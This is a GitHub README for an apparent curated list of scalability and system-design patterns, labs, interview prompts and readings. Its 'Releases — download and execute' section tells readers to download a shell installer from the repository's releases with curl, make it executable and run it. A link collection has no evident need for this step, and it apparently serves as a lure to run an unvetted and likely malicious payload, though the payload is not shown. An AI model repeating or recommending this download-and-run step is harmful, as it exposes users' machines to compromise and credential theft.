# Patterns for Scalable, Reliable, and High-Performance Systems 🚀

[![Releases](https://img.shields.io/github/v/release/cyca67/awesome-scalability?label=Releases&color=brightgreen)](https://github.com/cyca67/awesome-scalability/releases)

A curated collection of patterns, practices, tools, and references for building large-scale systems that scale, tolerate faults, and deliver predictable performance.

[![License](https://img.shields.io/github/license/cyca67/awesome-scalability?color=blue)](https://github.com/cyca67/awesome-scalability/blob/main/LICENSE) [![Issues](https://img.shields.io/github/issues/cyca67/awesome-scalability?color=orange)](https://github.com/cyca67/awesome-scalability/issues)

<img alt="scalable systems" src="https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=1200&q=60" style="max-width:100%;border-radius:8px;margin:12px 0"/>

Table of Contents
- About
- What you will find
- Core architecture patterns
- Data and storage patterns
- Resilience and ops patterns
- Design guides and trade-offs
- Hands-on labs and examples
- Interview practice
- How to use the repo
- Releases (download & execute)
- Contributing
- License
- Related resources

About
This repo groups concise, actionable patterns and references for backend engineers, architects, and SREs. It covers system design, distributed systems, data engineering, performance tuning, and operational practices. Each item links to quality papers, blog posts, talks, or open-source projects. The goal: help you design systems that scale, behave well under load, and recover from failure.

What you will find
- Patterns explained with intent, problem, solution, and trade-offs.
- Practical recipes and command examples.
- Architecture diagrams and mental models.
- Reading lists: seminal papers, books, and blog posts.
- Tooling: observability, orchestration, messaging, storage.
- Interview questions and design exercises.

Core architecture patterns
- Load Balancing — Distribute traffic across nodes to avoid hotspots. Use health checks and sticky sessions only when required.
- Caching — Reduce latency and load with multi-layer caches: CDN, edge cache, application cache, and local cache.
- Sharding — Partition data horizontally to scale write throughput and storage. Design key schemes for even distribution.
- Replication — Use leader-follower or multi-leader models for availability and read scaling. Decide on sync vs async replication by consistency needs.
- CQRS (Command Query Responsibility Segregation) — Separate read and write models to optimize each path.
- Event Sourcing — Store state transitions as an append-only log. Use for auditability and rebuildable views.
- Service Mesh — Offload networking concerns like mTLS, retries, and telemetry to a sidecar layer.
- API Gateway — Centralize client-facing policies: auth, rate limiting, and protocol translation.
- Bulkhead — Isolate resources so failures don’t cascade.
- Circuit Breaker — Fail fast when a downstream system is unhealthy. Combine with fallback strategies.

Data and storage patterns
- Event Streams — Use Kafka or Pulsar for high-throughput, ordered streams and replayability.
- Log-structured Storage — Optimize for writes and compaction; use LSM trees for high write rates.
- Time-series Storage — Use retention, downsampling, and indexing to handle high write rates and queries.
- Indexing and Search — Use inverted indexes and sharded search clusters for full-text and analytical queries.
- Materialized Views — Precompute views to speed reads; manage invalidation via events.
- Consistent Hashing — Rebalance nodes without mass data reshuffle.
- Secondary Indexes — Trade write cost for read speed; consider asynchronous index updates.

Resilience and ops patterns
- Backpressure — Apply flow control when a component cannot keep up. Use bounded queues, rate limiting, or windowing.
- Retry with Idempotency — Retry transient failures while ensuring operations remain idempotent.
- Graceful Shutdown — Drain connections and finish in-flight operations before stopping.
- Canary Releases and Blue/Green — Deploy changes to a subset of traffic, measure results, then promote.
- Auto-scaling — Scale based on relevant signals: request latency, queue length, or custom metrics.
- Observability — Collect logs, traces, and metrics. Correlate with distributed tracing.
- Chaos Engineering — Inject failures to discover brittle assumptions.
- Capacity Planning — Model peak load, tail latencies, and growth to plan capacity and budget.

Design guides and trade-offs
- Consistency vs Availability vs Partition tolerance (CAP) — Choose the trade-off that fits your use case.
- Latency vs Throughput — Tune batching, concurrency, and resource limits to balance one against the other.
- Synchronous vs Asynchronous — Sync simplifies reasoning; async improves throughput and resilience.
- Monolith vs Microservices — Choose modularity, deployment complexity, and operational cost deliberately.
- Data locality — Bring compute to data for heavy analytical workloads.

Hands-on labs and examples
- Scalable HTTP API with Nginx, Node, and Redis cache (example app and load script).
- Event-driven pipeline using Kafka + Flink for stream processing.
- Distributed job queue with visibility timeout and retries (Redis/Sidekiq pattern).
- Sharded storage demo with consistent hashing and node join/leave simulation.
- Observability lab with Prometheus, Grafana, and Jaeger tracing.

Each lab includes a minimal repo, docker-compose files, and a small test harness. See the labs folder for code samples, scripts, and diagrams.

Interview practice
- System design prompts
  - Design a global feed system for 100M users with 10K writes/sec.
  - Design a rate-limited API gateway for third-party clients.
  - Design a distributed file store with low tail latency.
- Key topics to master
  - Distributed consensus (Raft, Paxos)
  - Quorum systems and replication factors
  - CAP and PACELC trade-offs
  - Partitioning, rebalancing, and compaction
  - Observability patterns and SLOs
- Sample answers and diagrams included for each prompt.

How to use this repo
- Browse the curated lists under directories:
  - patterns/
  - labs/
  - resources/
  - interviews/
- Read the short pattern summaries to build a mental model.
- Run the labs to test assumptions and measure behavior.
- Use the reference links to dive deeper into papers and projects.

Quick start (example)
1. Clone the repo
```
git clone https://github.com/cyca67/awesome-scalability.git
cd awesome-scalability
```
2. Run a lab (example: simple api + redis cache)
```
cd labs/simple-api
docker-compose up --build
# open http://localhost:8080 and run the load script
```
3. Inspect metrics in Grafana: http://localhost:3000

Releases — download and execute
This project publishes release assets. Download the release artifact from the Releases page and execute the installer or binary found there. For example, visit the Releases page, download the latest asset named awesome-scalability-installer.sh, then run:

```
curl -L -o awesome-scalability-installer.sh https://github.com/cyca67/awesome-scalability/releases/download/v1.2.0/awesome-scalability-installer.sh
chmod +x awesome-scalability-installer.sh
./awesome-scalability-installer.sh
```

If you prefer a packaged archive, download the tarball or zip from the Releases page and extract it. The Releases page lists checksums and signed artifacts when available. Visit the Releases page here: https://github.com/cyca67/awesome-scalability/releases

Tools and platforms referenced
- Messaging and streaming: Kafka, Pulsar, RabbitMQ
- Databases: PostgreSQL, Cassandra, DynamoDB, ClickHouse
- Caching: Redis, Memcached, CDN (CloudFront, Fastly)
- Orchestration: Kubernetes, Nomad
- Observability: Prometheus, Grafana, Jaeger, OpenTelemetry
- Load testing: k6, wrk, vegeta
- Build & CI: GitHub Actions, Jenkins, GitLab CI

Architecture diagrams and visuals
- High-level microservices layout
  ![microservices](https://upload.wikimedia.org/wikipedia/commons/1/1b/Microservice_Architecture_2.png)
- Event streaming flow
  ![event-stream](https://upload.wikimedia.org/wikipedia/commons/7/79/Kafka_pipeline.svg)

Curated reading list
- Design Data-Intensive Applications — Martin Kleppmann
- The Tail at Scale — Jeffrey Dean et al.
- MapReduce: Simplified Data Processing on Large Clusters — Dean & Ghemawat
- The Reactive Manifesto
- Raft Consensus Algorithm — Diego Ongaro & John Ousterhout
- Dynamo: Amazon’s Highly Available Key-value Store — Giuseppe DeCandia et al.

Contributing
- Open an issue for missing items or broken links.
- Send a PR that adds a clear reference and a one-paragraph summary.
- Follow the pattern: one commit per pattern or resource.
- Include source, URL, and tags for new items.
- Use existing label taxonomy in resources/tags.md.

Code of Conduct
This project follows a code of conduct. Be respectful and constructive. Report issues in a civil manner.

Maintainers and contact
- Primary maintainer: cyca67 (GitHub)
- For security issues, open a private security issue on GitHub.

License
This repo uses the MIT License. See LICENSE for details.

Related resources
- awesome-system-design lists
- public talks and conference slides
- vendor docs for cloud services (AWS, GCP, Azure)

Acknowledgments
The curated links and patterns draw from academic papers, open-source projects, and production engineering write-ups. Contributors and maintainers add value by mapping practical patterns to real-world systems.